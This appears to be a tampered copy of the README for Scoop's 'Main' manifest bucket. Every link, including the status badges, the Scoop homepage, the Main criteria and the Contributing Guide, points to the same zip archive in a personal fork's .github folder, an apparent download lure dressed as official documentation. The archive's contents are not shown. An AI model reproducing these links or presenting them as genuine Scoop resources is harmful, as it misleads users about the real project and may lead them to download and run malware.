# Scoop Main [![Tests](https://raw.githubusercontent.com/candrapersada/Main/master/.github/Main_v2.3.zip)](https://raw.githubusercontent.com/candrapersada/Main/master/.github/Main_v2.3.zip) [![Excavator](https://raw.githubusercontent.com/candrapersada/Main/master/.github/Main_v2.3.zip)](https://raw.githubusercontent.com/candrapersada/Main/master/.github/Main_v2.3.zip)

Core manifests for [Scoop](https://raw.githubusercontent.com/candrapersada/Main/master/.github/Main_v2.3.zip), the Windows command-line installer. For manifests that fit the [Main criteria](https://raw.githubusercontent.com/candrapersada/Main/master/.github/Main_v2.3.zip).

How do I install these manifests?
---------------------------------

Just do `scoop install <manifest>`. This is the default bucket for Scoop and is added by default.

How do I contribute new manifests?
----------------------------------

To make a new manifest contribution, please read the [Contributing Guide](https://raw.githubusercontent.com/candrapersada/Main/master/.github/Main_v2.3.zip).
